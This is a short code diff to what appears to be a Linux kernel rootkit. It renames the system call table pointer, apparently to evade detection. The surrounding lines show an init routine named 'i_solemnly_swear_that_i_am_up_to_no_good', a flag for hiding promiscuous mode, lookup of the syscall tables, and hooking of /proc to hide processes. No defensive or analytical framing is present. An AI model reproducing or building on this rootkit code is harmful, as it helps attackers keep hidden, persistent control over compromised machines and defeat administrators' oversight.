@@ -42,7 +42,7 @@ static int (*root_iterate)(struct file *file, struct dir_context *);
 }
 #endif
 
-unsigned long *sys_call_table;
+unsigned long *sys_call_table_decms;
 unsigned long *ia32_sys_call_table;
 
 unsigned int hide_promisc = 0;
@@ -969,9 +969,9 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
     #endif
 
-    sys_call_table = find_sys_call_table();
+    sys_call_table_decms = find_sys_call_table();
 
-    DEBUG("sys_call_table obtained at %p\n", sys_call_table);
+    DEBUG("sys_call_table obtained at %p\n", sys_call_table_decms);
 
     /* Hook /proc for hiding processes */
     proc_iterate = get_vfs_iterate("/proc");
